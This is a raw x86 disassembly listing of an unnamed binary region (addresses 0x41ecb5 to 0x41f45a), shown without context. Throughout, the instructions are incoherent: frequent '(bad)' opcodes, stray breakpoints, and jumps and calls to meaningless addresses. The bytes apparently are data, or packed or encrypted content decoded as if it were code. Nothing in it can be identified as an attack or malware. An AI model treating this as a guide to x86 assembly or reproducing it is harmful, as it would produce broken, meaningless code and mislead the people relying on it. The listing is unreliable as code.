  41ecb5:	add    DWORD PTR [eax],0x4e
  41ecb8:	or     bh,bh
  41ecba:	pop    DWORD PTR [ebp+0xc890000]
  41ecc0:	or     edx,ebx
  41ecc2:	mov    DWORD PTR [ebx+0x3800891d],eax
  41ecc8:	into   
  41ecc9:	add    cl,ch
  41eccb:	data16 int3 
  41eccd:	cmp    edi,0xffffff97
  41ecd0:	scas   eax,DWORD PTR es:[edi]
  41ecd1:	std    
  41ecd2:	add    BYTE PTR [ebx-0x5f007c49],al
  41ecd8:	jae    0x41ec63
  41ecda:	fadd   DWORD PTR [ebp+0x2cff83ff]
  41ece0:	pop    eax
  41ece1:	std    
  41ece2:	add    bh,bh
  41ece4:	and    bh,bh
  41ece6:	add    BYTE PTR [esp+ecx*4],cl
  41ece9:	sub    DWORD PTR [esi+0x69],0xffffffff
  41eced:	mov    DWORD PTR [eax],eax
  41ecef:	out    dx,eax
  41ecf0:	xchg   esp,eax
  41ecf1:	mov    edi,0x83ad0089
  41ecf6:	int3   
  41ecf7:	(bad)  
  41ecf8:	test   ah,0x8d
  41ecfb:	pushf  
  41ecfc:	add    bh,bh
  41ecfe:	mov    DWORD PTR [ecx-0x20],edx
  41ed01:	(bad)  
  41ed02:	inc    DWORD PTR [eax]
  41ed04:	xor    esp,ecx
  41ed06:	dec    DWORD PTR [edx-0x1219ff84]
  41ed0c:	dec    DWORD PTR [ecx-0x254e6834]
  41ed12:	int3   
  41ed13:	(bad)  
  41ed14:	jl     0x41ec99
  41ed16:	mov    edi,ecx
  41ed18:	dec    edi
  41ed19:	dec    DWORD PTR [ebp-0x75]
  41ed1f:	pop    ebx
  41ed20:	inc    ecx
  41ed21:	pusha  
  41ed22:	inc    DWORD PTR [ebx-0x3600003f]
  41ed28:	aaa    
  41ed29:	add    BYTE PTR [esi-0xa],dl
  41ed2c:	inc    DWORD PTR [eax]
  41ed2e:	call   DWORD PTR [ebx]
  41ed30:	retf   
  41ed31:	stos   BYTE PTR es:[edi],al
  41ed32:	inc    DWORD PTR [eax]
  41ed34:	ud0    eax,DWORD PTR [ebx+0x53ff79a1]
  41ed3b:	xchg   ecx,eax
  41ed3c:	dec    esp
  41ed3e:	mov    DWORD PTR [eax],esi
  41ed40:	(bad)  
  41ed41:	aad    0x0
  41ed43:	add    dl,bh
  41ed45:	cmp    edi,0xffffffe9
  41ed48:	rol    DWORD PTR [eax],cl
  41ed4a:	arpl   WORD PTR [ebp-0x1],cx
  41ed4d:	mov    esp,ecx
  41ed4f:	test   ecx,ebx
  41ed51:	(bad)  
  41ed52:	dec    DWORD PTR [ecx-0x4e007cfc]
  41ed58:	push   0x8387acff
  41ed5d:	int3   
  41ed5e:	add    BYTE PTR [ebx+0x7e],dh
  41ed61:	dec    edi
  41ed62:	inc    DWORD PTR [eax]
  41ed64:	inc    esp
  41ed65:	dec    DWORD PTR [ecx+0x32830f31]
  41ed6b:	dec    esp
  41ed6d:	mov    edi,edi
  41ed6f:	data16 and al,BYTE PTR [edx+0xdc00cc]
  41ed76:	push   DWORD PTR [eax+0x25e0008]
  41ed7c:	mov    edi,edi
  41ed7e:	jmp    FWORD PTR [ecx-0xffc3d2]
  41ed84:	std    
  41ed85:	add    bh,bh
  41ed87:	(bad)  
  41ed88:	xchg   ebx,eax
  41ed89:	jmp    DWORD PTR [edi]
  41ed8b:	sti    
  41ed8c:	add    bh,bh
  41ed8e:	call   edx
  41ed90:	mov    ecx,esi
  41ed92:	int3   
  41ed93:	add    BYTE PTR [edi],dh
  41ed95:	(bad)  
  41ed96:	(bad)  
  41ed97:	mov    esi,0xbc8cff0e
  41ed9c:	mov    DWORD PTR [ebx+0x780bae00],eax
  41eda2:	dec    DWORD PTR [ecx+0x4aff0020]
  41eda8:	or     BYTE PTR [ecx-0x7c6a02],cl
  41edae:	int3   
  41edaf:	call   0x33:0xcc00582b
  41edb6:	jmp    FWORD PTR [ebp-0x47]
  41edb9:	call   DWORD PTR [ebp-0xa9]
  41edbf:	inc    edx
  41edc0:	test   eax,0xafffff22
  41edc5:	(bad)  
  41edc6:	push   DWORD PTR [edi+0x16e38990]
  41edcc:	(bad)  
  41edcd:	(bad)  
  41edce:	jmp    DWORD PTR [ebx]
  41edd0:	pop    ebp
  41edd1:	mov    esi,0x83ad8300
  41edd6:	cmp    DWORD PTR [esi+0x8],0xffffff83
  41edda:	stos   BYTE PTR es:[edi],al
  41eddb:	xchg   esi,eax
  41eddc:	add    BYTE PTR [ebx+0x74c20500],al
  41ede2:	add    ah,cl
  41ede4:	pusha  
  41ede5:	add    BYTE PTR [eax],al
  41ede7:	push   esi
  41ede8:	pop    DWORD PTR [ebx+0xcc921f]
  41edee:	mov    DWORD PTR [edi+0x3a],ebp
  41edf1:	jo     0x41edf3
  41edf3:	(bad)  
  41edf4:	sti    
  41edf5:	inc    DWORD PTR [eax]
  41edf7:	jns    0x41edb3
  41edf9:	push   DWORD PTR [edi+0x6a]
  41edfc:	int3   
  41edfd:	add    BYTE PTR [eax],al
  41edff:	add    bh,BYTE PTR [edx-0x61]
  41ee02:	(bad)  
  41ee03:	call   FWORD PTR [eax-0x4c070000]
  41ee09:	add    ah,ah
  41ee0b:	add    BYTE PTR [eax],0xff
  41ee0e:	call   DWORD PTR [edx]
  41ee10:	bound  esp,QWORD PTR [ecx+0x0]
  41ee13:	call   DWORD PTR [ebx+eax*4-0x4d5f00]
  41ee1a:	jns    0x41ee4c
  41ee1c:	inc    DWORD PTR [eax]
  41ee1e:	or     DWORD PTR [edi],0xfffffff9
  41ee21:	inc    esi
  41ee22:	inc    DWORD PTR [eax]
  41ee24:	mov    ecx,0xfba683ff
  41ee29:	add    dh,al
  41ee2b:	sbb    eax,0x47000000
  41ee30:	and    dl,BYTE PTR [edi-0x1]
  41ee33:	dec    DWORD PTR [ebx+0x7feeffff]
  41ee39:	(bad)  
  41ee3a:	stc    
  41ee3b:	ins    BYTE PTR es:[edi],dx
  41ee3c:	inc    DWORD PTR [ebx+0x2d55bff]
  41ee42:	cmp    edi,0xfffffff5
  41ee45:	(bad)  
  41ee46:	call   FWORD PTR [edx+0x348e83e6]
  41ee4c:	add    BYTE PTR [eax],al
  41ee4e:	inc    DWORD PTR [esi-0x35]
  41ee51:	outs   dx,DWORD PTR ds:[esi]
  41ee52:	int3   
  41ee53:	xor    esi,0xffffff83
  41ee56:	int3   
  41ee57:	cld    
  41ee58:	das    
  41ee59:	int3   
  41ee5a:	push   ecx
  41ee5b:	hlt    
  41ee5c:	add    bh,bh
  41ee5e:	mov    DWORD PTR [ecx+eax*1+0x250083ef],ebx
  41ee65:	add    ah,cl
  41ee67:	mov    edx,esp
  41ee69:	jmp    DWORD PTR [ebx-0x7c00b1]
  41ee6f:	sbb    edx,DWORD PTR [ebx-0x38]
  41ee72:	int3   
  41ee73:	call   DWORD PTR [ebp-0x77]
  41ee76:	add    BYTE PTR [ecx+0x29c2ffc1],ch
  41ee7c:	add    bh,bh
  41ee7e:	int3   
  41ee7f:	inc    edx
  41ee80:	call   0x1f41ee89
  41ee85:	add    BYTE PTR [ebx-0x7affcab8],al
  41ee8b:	(bad)  
  41ee8c:	inc    DWORD PTR [eax]
  41ee8e:	add    BYTE PTR [edi+0xa796],al
  41ee94:	dec    edi
  41ee95:	inc    DWORD PTR [eax]
  41ee97:	scas   eax,DWORD PTR es:[edi]
  41ee98:	mov    cl,BYTE PTR [ecx-0x7cff8083]
  41ee9e:	add    BYTE PTR [ecx],dh
  41eea0:	lea    eax,[edx-0x1]
  41eea3:	push   DWORD PTR [edx]
  41eea5:	add    BYTE PTR [eax],al
  41eea7:	ror    BYTE PTR [eax-0x77],cl
  41eeaa:	mov    edi,0xcc0083b0
  41eeaf:	jl     0x41ef24
  41eeb1:	or     al,0x0
  41eeb3:	int3   
  41eeb4:	mov    esi,0x371f0000
  41eeb9:	jmp    DWORD PTR [ecx*1-0x7a7d0000]
  41eec0:	cld    
  41eec1:	fwait
  41eec2:	add    bh,bh
  41eec4:	(bad)  
  41eec5:	dec    esp
  41eec7:	pop    edi
  41eec8:	cli    
  41eec9:	add    BYTE PTR [ebp-0xe0],bl
  41eecf:	cmp    edi,0xffffffbf
  41eed2:	add    BYTE PTR [eax],al
  41eed4:	inc    esp
  41eed5:	add    BYTE PTR [ecx-0x40010bb],cl
  41eedb:	and    edi,edi
  41eedd:	add    bh,bh
  41eedf:	bound  eax,QWORD PTR [ecx+edx*4+0x89ff00]
  41eee6:	add    BYTE PTR [ebx+0x7c],ah
  41eee9:	(bad)  
  41eeea:	std    
  41eeeb:	xlat   BYTE PTR ds:[ebx]
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	call   DWORD PTR [ecx+0x83ac02]
  41eef4:	push   ss
  41eef5:	inc    DWORD PTR [eax]
  41eef7:	sbb    eax,0x1ba8cc5d
  41eefc:	(bad)  
  41eefd:	inc    DWORD PTR [eax]
  41eeff:	nop
  41ef00:	mov    ah,0xd9
  41ef02:	(bad)  
  41ef03:	push   DWORD PTR [edi-0x1]
  41ef06:	call   DWORD PTR ds:0x300fcced
  41ef0c:	(bad)  
  41ef0d:	dec    esp
  41ef0f:	push   eax
  41ef10:	ds (bad) 
  41ef12:	mov    DWORD PTR [ecx+0xbffcc38],ecx
  41ef18:	push   DWORD PTR [bx+di-0x7c4a]
  41ef1d:	inc    DWORD PTR [ebx-0x125764]
  41ef23:	add    BYTE PTR [ebx-0x1],ah
  41ef26:	add    BYTE PTR [edx+0xe0483e9],dh
  41ef2c:	cmp    edi,0xffffffff
  41ef2f:	rol    DWORD PTR [eax],cl
  41ef31:	out    dx,eax
  41ef32:	cmp    edi,0x49
  41ef35:	inc    DWORD PTR [eax]
  41ef37:	aas    
  41ef38:	xchg   DWORD PTR [ebx-0x7cff0535],eax
  41ef3e:	mov    DWORD PTR [ebp-0x5c],esp
  41ef41:	xchg   esp,eax
  41ef42:	add    bh,bh
  41ef44:	jecxz  0x41eecf
  41ef46:	add    BYTE PTR [edx],cl
  41ef48:	dec    edx
  41ef49:	inc    DWORD PTR [esi]
  41ef4b:	add    BYTE PTR [ebx-0x19027d00],0xd6
  41ef52:	(bad)  
  41ef53:	(bad)  
  41ef54:	cmp    bh,bh
  41ef56:	add    BYTE PTR [esi],bl
  41ef58:	in     eax,0x0
  41ef5a:	jne    0x41eeff
  41ef5c:	(bad)  
  41ef5d:	(bad)  
  41ef5e:	push   edi
  41ef60:	mov    ecx,0x79ffffa9
  41ef65:	add    DWORD PTR [eax],0xffffff9a
  41ef68:	pop    ds
  41ef69:	dec    ecx
  41ef6b:	and    DWORD PTR [eax],eax
  41ef6d:	inc    DWORD PTR [eax]
  41ef6f:	and    al,0xcb
  41ef71:	inc    ebp
  41ef72:	inc    DWORD PTR [eax]
  41ef74:	push   ss
  41ef75:	add    DWORD PTR [eax],0x18
  41ef78:	sti    
  41ef79:	add    BYTE PTR [ecx+0x89ff38],dh
  41ef7f:	loopne 0x41ef56
  41ef81:	mov    ah,0x0
  41ef83:	add    BYTE PTR [edi-0x1],dl
  41ef86:	jmp    FWORD PTR [edi]
  41ef88:	add    bh,bh
  41ef8a:	inc    ecx
  41ef8b:	push   edx
  41ef8c:	add    BYTE PTR [ecx+0x431c7f00],cl
  41ef92:	mov    edi,edi
  41ef94:	je     0x41ef95
  41ef96:	dec    DWORD PTR [edi]
  41ef98:	(bad)  
  41ef9a:	fbstp  TBYTE PTR [esi]
  41ef9c:	inc    DWORD PTR [ebx-0x25946500]
  41efa2:	add    bh,bh
  41efa4:	sub    ah,cl
  41efa6:	push   DWORD PTR [edx]
  41efa8:	scas   al,BYTE PTR es:[edi]
  41efa9:	add    DWORD PTR [ecx+0x3c],0xffffff83
  41efad:	(bad)  
  41efae:	dec    DWORD PTR [edx+ebp*4-0x2e]
  41efb2:	add    BYTE PTR [ebx+0x27ff0024],al
  41efb8:	int3   
  41efb9:	jmp    DWORD PTR [esi+eax*1]
  41efbc:	(bad)  
  41efbd:	inc    DWORD PTR [eax]
  41efbf:	(bad)  
  41efc0:	test   eax,0x20008366
  41efc5:	add    bh,bh
  41efc7:	push   ds
  41efc8:	ret    0xc500
  41efcb:	mov    ah,0x0
  41efcd:	or     DWORD PTR [ecx-0xa8ac15],0x0
  41efd4:	lds    eax,FWORD PTR [eax]
  41efd6:	add    BYTE PTR [esi+0x56],dl
  41efd9:	push   DWORD PTR [esi]
  41efdb:	data16 add bh,bh
  41efde:	inc    DWORD PTR [ecx+0x2]
  41efe1:	push   cs
  41efe2:	add    bh,bh
  41efe4:	add    eax,DWORD PTR [eax]
  41efe6:	add    dh,dl
  41efe8:	in     al,dx
  41efe9:	(bad)  
  41efea:	fsub   QWORD PTR [ebx]
  41efec:	dec    esp
  41efee:	add    BYTE PTR [esi+0x36],ah
  41eff1:	mov    ?,edi
  41eff3:	add    BYTE PTR [ebp+0x0],dh
  41eff6:	int3   
  41eff7:	call   0xffff:0x55cf83c8
  41effe:	push   DWORD PTR [edx-0xb902]
  41f004:	ret    0xffff
  41f007:	loope  0x41efe0
  41f009:	mov    DWORD PTR [ecx-0x33ff00e0],edi
  41f00f:	in     al,dx
  41f010:	inc    esi
  41f011:	mov    dh,0x0
  41f013:	add    BYTE PTR [ebp-0x7d],ah
  41f016:	(bad)  
  41f017:	mov    ebx,0xedfdffcb
  41f01c:	(bad)  
  41f01d:	inc    DWORD PTR [ebx-0x76d4aa9f]
  41f023:	(bad)  
  41f024:	in     eax,dx
  41f025:	inc    DWORD PTR [eax]
  41f027:	mov    ss,WORD PTR [edi+edi*8]
  41f02a:	mov    ebx,0xff00002a
  41f02f:	icebp  
  41f030:	and    eax,0x8c000082
  41f035:	add    BYTE PTR [ebx+0x56ffb281],al
  41f03b:	push   0xffffffff
  41f03d:	dec    esp
  41f03f:	and    DWORD PTR [esi-0x77ff760f],0xffffffff
  41f046:	dec    ecx
  41f048:	out    dx,eax
  41f049:	push   DWORD PTR [ecx]
  41f04b:	mov    eax,DWORD PTR [ebx+0x3802ccff]
  41f051:	pop    ss
  41f052:	(bad)  
  41f053:	(bad)  
  41f054:	jl     0x41f056
  41f056:	call   DWORD PTR [ecx]
  41f058:	jecxz  0x41f05a
  41f05a:	jg     0x41f04d
  41f05c:	(bad)  
  41f05d:	(bad)  
  41f05e:	push   DWORD PTR [ecx-0x76fffe75]
  41f064:	mov    eax,DWORD PTR [eax]
  41f066:	add    BYTE PTR [edx],dl
  41f068:	dec    esi
  41f069:	jmp    eax
  41f06b:	les    eax,FWORD PTR [eax]
  41f06d:	add    DWORD PTR [eax],0xfffffffa
  41f070:	dec    esi
  41f071:	xor    bh,bh
  41f073:	add    BYTE PTR [edi+edi*8-0x7d],dh
  41f077:	jmp    0x620e73b3
  41f07c:	(bad)  
  41f07d:	(bad)  
  41f07e:	call   DWORD PTR [eax]
  41f080:	idiv   dl
  41f082:	add    BYTE PTR [ecx-0x7d007676],cl
  41f088:	sahf   
  41f089:	dec    DWORD PTR [ebx+0x4f]
  41f08c:	add    BYTE PTR [ecx-0x5d449f01],cl
  41f092:	add    bh,bh
  41f094:	cmp    al,0xcc
  41f096:	jmp    FWORD PTR [esi-0x35]
  41f099:	add    BYTE PTR [eax-0x7cff77],dh
  41f09f:	inc    edi
  41f0a0:	int    0xc7
  41f0a2:	inc    DWORD PTR [eax]
  41f0a4:	call   0xc4c6f0a8
  41f0a9:	add    BYTE PTR [ebp-0x32],ah
  41f0ac:	add    bh,bh
  41f0ae:	(bad)  
  41f0af:	mov    edi,0x44c6
  41f0b4:	pop    edi
  41f0b5:	mov    DWORD PTR [eax],eax
  41f0b7:	inc    ebx
  41f0b8:	push   ecx
  41f0b9:	add    dh,al
  41f0bb:	test   eax,0xbeffffff
  41f0c0:	mov    ch,0xfd
  41f0c2:	add    bh,bh
  41f0c4:	loope  0x41f092
  41f0c6:	inc    esi
  41f0c8:	jg     0x41f096
  41f0ca:	dec    ebp
  41f0cb:	cmp    al,BYTE PTR [eax]
  41f0cd:	add    bh,bh
  41f0cf:	and    eax,0xff00ac0d
  41f0d4:	add    WORD PTR [ebx+0x3cff42f7],0xffc2
  41f0dc:	add    DWORD PTR [ebx+0x1bfa1083],0x0
  41f0e3:	add    eax,0x0
  41f0e6:	add    BYTE PTR [edx+0x8b183a4],dh
  41f0ec:	add    BYTE PTR [ebx+0x4d101fff],al
  41f0f2:	add    BYTE PTR [eax],al
  41f0f4:	xor    esp,ecx
  41f0f6:	int3   
  41f0f7:	shr    DWORD PTR [eax+eax*1],cl
  41f0fa:	adc    edx,DWORD PTR [edx-0x1]
  41f0fd:	(bad)  
  41f0fe:	jmp    FWORD PTR [eax-0x33ff7c42]
  41f104:	pushf  
  41f105:	(bad)  
  41f106:	jmp    FWORD PTR [edi]
  41f108:	add    DWORD PTR [eax],0x896c6b
  41f10e:	(bad)  
  41f10f:	cmp    ebx,DWORD PTR [edx]
  41f111:	in     eax,dx
  41f112:	dec    DWORD PTR [ecx+0x5bccff97]
  41f118:	inc    ebp
  41f119:	push   DWORD PTR ds:0x83c9
  41f11f:	out    0x36,al
  41f121:	mov    ds:0x84ffff,eax
  41f126:	add    BYTE PTR [esi+edx*2-0x7d],ah
  41f12a:	loopne 0x41f0f7
  41f12c:	add    BYTE PTR [eax],al
  41f12e:	jmp    FWORD PTR [esi+0x29]
  41f131:	hlt    
  41f132:	add    bh,bh
  41f134:	jae    0x41f136
  41f136:	call   DWORD PTR [edi]
  41f138:	mov    ch,0x0
  41f13a:	mov    edi,edi
  41f13c:	dec    esp
  41f13e:	push   DWORD PTR [ebx-0x76495d]
  41f144:	icebp  
  41f145:	mov    edi,edi
  41f147:	sti    
  41f148:	cmp    bh,0x6b
  41f14b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14c:	inc    DWORD PTR [eax]
  41f14e:	(bad)  
  41f14f:	jle    0x41f0de
  41f151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f152:	add    ah,cl
  41f154:	add    BYTE PTR [eax],0x0
  41f157:	scas   al,BYTE PTR es:[edi]
  41f158:	xor    bh,bh
  41f15a:	pop    esi
  41f15b:	xor    bh,bh
  41f15d:	add    bh,bh
  41f15f:	jmp    0x41f0e9
  41f161:	je     0x41f162
  41f163:	sub    DWORD PTR [eax],0xffffffff
  41f166:	(bad)  
  41f167:	jmp    0xff00:0xded3cc24
  41f16e:	inc    DWORD PTR [edi+eax*1+0x30]
  41f172:	add    DWORD PTR [eax],0x13
  41f175:	add    BYTE PTR [eax],al
  41f177:	sub    BYTE PTR ds:0xff8a2089,0x0
  41f17e:	jmp    FWORD PTR [edx-0x35]
  41f181:	xchg   ebp,eax
  41f182:	(bad)  
  41f183:	push   DWORD PTR [esi-0x1]
  41f186:	add    BYTE PTR [edx],dl
  41f188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f189:	add    ch,al
  41f18b:	sti    
  41f18c:	add    BYTE PTR [eax],al
  41f18e:	mov    edx,ebx
  41f190:	pop    edx
  41f191:	sub    bh,bh
  41f193:	mov    esp,edi
  41f195:	(bad)  
  41f196:	inc    DWORD PTR [eax+0x41]
  41f199:	jmp    ebx
  41f19b:	lds    ecx,FWORD PTR [ecx-0x13923377]
  41f1a1:	mov    ds:0xff2800ff,al
  41f1a6:	adc    edx,0xffffffb9
  41f1a9:	add    al,cl
  41f1ab:	adc    al,BYTE PTR [eax]
  41f1ad:	(bad)  
  41f1ae:	dec    DWORD PTR [ecx-0x79]
  41f1b1:	int    0xff
  41f1b3:	push   DWORD PTR [ebx]
  41f1b5:	int3   
  41f1b6:	(bad)  
  41f1b7:	cli    
  41f1b8:	das    
  41f1b9:	(bad)  
  41f1ba:	in     al,dx
  41f1bb:	loope  0x41f1bd
  41f1bd:	add    BYTE PTR [eax],al
  41f1bf:	mov    dl,0xca
  41f1c1:	dec    ecx
  41f1c2:	mov    edi,edi
  41f1c4:	add    eax,0xfff8ccff
  41f1c9:	cmp    DWORD PTR [esi-0x7c760067],0x77
  41f1d0:	push   edi
  41f1d1:	out    0xff,eax
  41f1d3:	call   FWORD PTR [edi-0x7245ff01]
  41f1d9:	int3   
  41f1da:	bound  ebx,QWORD PTR [eax+0x67ffff83]
  41f1e0:	fdivr  DWORD PTR [ebp-0x1]
  41f1e3:	push   edi
  41f1e5:	cmp    edi,0x45
  41f1e8:	cmc    
  41f1e9:	(bad)  
  41f1ea:	mov    edi,0xff8348
  41f1ef:	adc    eax,0xff894a87
  41f1f4:	inc    WORD PTR [eax]
  41f1f7:	xchg   esp,eax
  41f1f8:	and    edi,edi
  41f1fa:	outs   dx,DWORD PTR ds:[esi]
  41f1fb:	inc    esi
  41f1fc:	inc    DWORD PTR [eax]
  41f1fe:	add    BYTE PTR [esi+0x89151a],dh
  41f204:	stos   DWORD PTR es:[edi],eax
  41f205:	int3   
  41f206:	cmp    ebx,0x5c
  41f209:	add    BYTE PTR [eax],bh
  41f20b:	add    edi,edi
  41f20d:	add    bh,bh
  41f20f:	mov    ds:0xccffbd6a,al
  41f214:	mov    edi,?
  41f216:	call   DWORD PTR [edx]
  41f218:	inc    esi
  41f219:	cmp    DWORD PTR [esi+0x83ff53],0x6f
  41f220:	fstp   DWORD PTR [eax+eax*1]
  41f223:	jmp    FWORD PTR [ebx]
  41f225:	inc    DWORD PTR [eax]
  41f227:	(bad)  
  41f228:	pop    esi
  41f229:	jmp    FWORD PTR [ebx]
  41f22b:	scas   al,BYTE PTR es:[edi]
  41f22c:	(bad)  
  41f22d:	(bad)  
  41f22e:	call   FWORD PTR [edx-0x5c]
  41f231:	xor    eax,DWORD PTR [eax]
  41f233:	push   ebx
  41f235:	(bad)  
  41f236:	(bad)  
  41f237:	out    dx,eax
  41f238:	verw   WORD PTR [edi]
  41f23b:	push   es
  41f23c:	add    BYTE PTR [ecx-0x7826967d],cl
  41f242:	mov    edi,edi
  41f244:	push   0xffffff83
  41f246:	(bad)  
  41f247:	jns    0x41f22e
  41f249:	jmp    FWORD PTR [eax]
  41f24b:	rol    BYTE PTR [eax],0x89
  41f24e:	add    BYTE PTR [ebp+0x7c],bl
  41f251:	push   esi
  41f252:	dec    esp
  41f254:	add    eax,DWORD PTR [ebx-0xccfd01]
  41f25a:	out    0x9e,eax
  41f25c:	(bad)  
  41f25d:	(bad)  
  41f25e:	inc    DWORD PTR [edx-0x3342e0]
  41f264:	in     eax,dx
  41f265:	or     DWORD PTR [ecx-0x5aff5a55],0x39
  41f26c:	(bad)  
  41f26d:	inc    DWORD PTR [ebx-0xd0a4c5]
  41f273:	call   DWORD PTR ds:0x5c23ff00
  41f279:	inc    DWORD PTR [ebx-0x12]
  41f27c:	inc    DWORD PTR [eax]
  41f27e:	inc    DWORD PTR [edx+0x74]
  41f281:	idiv   edi
  41f283:	add    DWORD PTR [edi+0x0],0xffffff89
  41f287:	mov    al,ds:0x7ed800f9
  41f28c:	cmp    edi,0x0
  41f28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f290:	add    al,BYTE PTR [edi-0x1]
  41f293:	inc    DWORD PTR [esi+0x0]
  41f296:	add    BYTE PTR [ebp-0x3516ffcf],al
  41f29c:	(bad)  
  41f29d:	(bad)  
  41f29e:	(bad)  
  41f29f:	mov    ebp,0x830064eb
  41f2a4:	mov    ds:0x8d23ff00,eax
  41f2a9:	int3   
  41f2aa:	enter  0xa3,0xff
  41f2ae:	inc    DWORD PTR [ebp+0xff6394]
  41f2b4:	add    eax,0xd579ffff
  41f2b9:	jmp    DWORD PTR [ebx+0x48]
  41f2bc:	add    BYTE PTR [eax],al
  41f2be:	push   DWORD PTR ds:0xffffec34
  41f2c4:	or     al,BYTE PTR [ebx-0x199b01]
  41f2ca:	add    BYTE PTR [edi+0x0],ah
  41f2cd:	dec    DWORD PTR [ecx-0xe341fe]
  41f2d3:	inc    DWORD PTR [eax]
  41f2d5:	add    bh,bh
  41f2d7:	imul   edx,ebx,0xff31afff
  41f2dd:	(bad)  
  41f2de:	inc    edi
  41f2e0:	mov    edi,0xf80000a1
  41f2e5:	inc    DWORD PTR [eax]
  41f2e7:	jo     0x41f30d
  41f2e9:	jmp    DWORD PTR [ebx]
  41f2eb:	cmp    eax,0x3e83ff00
  41f2f0:	mov    eax,ds:0x48ff0034
  41f2f5:	cmp    edi,0xffffffc4
  41f2f8:	enter  0x8ff,0xd3
  41f2fc:	add    bh,bh
  41f2fe:	and    DWORD PTR [ecx+0x7],0x5b
  41f302:	inc    DWORD PTR [eax]
  41f304:	ins    BYTE PTR es:[edi],dx
  41f305:	dec    esp
  41f307:	neg    BYTE PTR [esi-0x77]
  41f30a:	imul   ebp,DWORD PTR [eax],0xeaff89ff
  41f310:	mov    bh,0x15
  41f312:	add    bh,bh
  41f314:	sahf   
  41f315:	add    bh,bh
  41f317:	mov    bh,0x8b
  41f319:	call   DWORD PTR [eax+0x28]
  41f31c:	add    DWORD PTR [ebx+0x58ccc0ff],0xffffffff
  41f323:	int3   
  41f324:	or     eax,0xa4e0000
  41f329:	mov    eax,edi
  41f32b:	cmp    edi,edi
  41f32d:	or     esp,0xffffffb6
  41f330:	inc    esp
  41f331:	pop    edi
  41f332:	add    DWORD PTR [eax],0x2f
  41f335:	dec    DWORD PTR [ecx+0x6600a938]
  41f33b:	scas   al,BYTE PTR es:[edi]
  41f33c:	add    BYTE PTR [eax],al
  41f33e:	jmp    DWORD PTR [ebx]
  41f340:	jae    0x41f38b
  41f342:	add    bh,bh
  41f344:	sub    eax,0xbe448300
  41f349:	int3   
  41f34a:	dec    edx
  41f34b:	loop   0x41f319
  41f34d:	(bad)  
  41f34e:	(bad)  
  41f34f:	jle    0x41f36f
  41f351:	xor    al,0xcc
  41f353:	add    BYTE PTR [ecx+0x0],al
  41f356:	call   FWORD PTR [ebp+0x41270081]
  41f35c:	inc    DWORD PTR [eax]
  41f35e:	call   FWORD PTR [ecx]
  41f360:	cmp    edi,DWORD PTR [eax-0x77]
  41f363:	dec    DWORD PTR ds:0x5e3900ff
  41f369:	sbb    DWORD PTR [edx],0x1
  41f36c:	(bad)  
  41f36d:	(bad)  
  41f36e:	call   FWORD PTR [ecx]
  41f370:	cmc    
  41f371:	stc    
  41f372:	dec    esp
  41f374:	mov    sp,cx
  41f377:	xchg   edx,eax
  41f378:	lds    eax,FWORD PTR [eax]
  41f37a:	xchg   esi,eax
  41f37b:	sbb    eax,0x48ffff00
  41f380:	lea    ecx,[esp+ecx*8-0x7d]
  41f384:	and    DWORD PTR [eax],eax
  41f386:	int3   
  41f387:	rcr    BYTE PTR [ebp+0x0],1
  41f38a:	je     0x41f3fe
  41f38c:	cmp    edi,0xffffffff
  41f38f:	push   cs
  41f390:	add    ebx,ebx
  41f392:	int3   
  41f393:	sbb    eax,0xffffffff
  41f396:	jmp    FWORD PTR [edx+0x38]
  41f399:	add    BYTE PTR [ebx],cl
  41f39b:	add    DWORD PTR [ebx-0x4a090000],0x49838394
  41f3a5:	int3   
  41f3a6:	add    BYTE PTR [edx+0x28],al
  41f3a9:	add    BYTE PTR [edx+esi*2],bh
  41f3ac:	(bad)  
  41f3ad:	(bad)  
  41f3ae:	call   FWORD PTR [esi-0x4e]
  41f3b1:	xchg   esp,eax
  41f3b2:	(bad)  
  41f3b3:	dec    DWORD PTR [edi+edi*8-0x7d]
  41f3b7:	mov    al,ds:0x59dc89b9
  41f3bc:	add    BYTE PTR [ebx-0x67d88800],al
  41f3c2:	or     esp,0xffffffb0
  41f3c5:	add    BYTE PTR [eax],al
  41f3c7:	lods   eax,DWORD PTR ds:[esi]
  41f3c8:	rol    DWORD PTR [eax],1
  41f3ca:	or     BYTE PTR [edi-0x6fff0100],al
  41f3d0:	in     al,dx
  41f3d1:	jg     0x41f3d3
  41f3d3:	add    BYTE PTR [ebp-0x77],bh
  41f3d6:	jmp    FWORD PTR [ebp+0x7542ff50]
  41f3dc:	cmp    edi,0xffffff83
  41f3df:	mov    cl,0x9
  41f3e1:	inc    BYTE PTR [ebx+0xccb583]
  41f3e7:	shr    DWORD PTR [esi-0x3386527d],1
  41f3ed:	(bad)  
  41f3ee:	jmp    FWORD PTR [edx]
  41f3f0:	pusha  
  41f3f1:	jmp    0x2383:0xff370000
  41f3f8:	pop    esi
  41f3f9:	mov    esi,esi
  41f3fb:	scas   eax,DWORD PTR es:[edi]
  41f3fc:	mov    esp,ecx
  41f3fe:	mov    DWORD PTR [edx-0x42],ebp
  41f401:	adc    bh,bh
  41f403:	mov    esp,esp
  41f405:	(bad)  
  41f406:	jmp    FWORD PTR [ebx+0x189a00a0]
  41f40c:	(bad)  
  41f40d:	inc    DWORD PTR [eax]
  41f40f:	ror    eax,cl
  41f411:	sar    bh,cl
  41f413:	(bad)  
  41f414:	ds (bad) 
  41f416:	dec    DWORD PTR [ecx]
  41f418:	mov    ebp,0x897a2b83
  41f41d:	add    bh,bh
  41f41f:	pop    edx
  41f420:	(bad)  
  41f421:	push   edx
  41f422:	inc    DWORD PTR [ebx+0x5c00ff09]
  41f428:	adc    eax,0x83732bcc
  41f42d:	add    BYTE PTR [eax],al
  41f42f:	inc    ebx
  41f430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f431:	cmp    al,0xff
  41f433:	add    BYTE PTR [ebx+0x0],ch
  41f436:	mov    ecx,eax
  41f438:	cmp    edi,edi
  41f43a:	push   0xff008317
  41f43f:	das    
  41f440:	push   0xc8ffff40
  41f445:	mov    edi,edi
  41f447:	mov    dh,0xca
  41f449:	call   DWORD PTR [ebp-0xff000f]
  41f44f:	or     al,0xc
  41f451:	(bad)  
  41f452:	dec    esp
  41f454:	lods   al,BYTE PTR ds:[esi]
  41f455:	cmp    edi,0xffffffcb
  41f458:	add    eax,DWORD PTR [eax]
  41f45a:	(bad)  
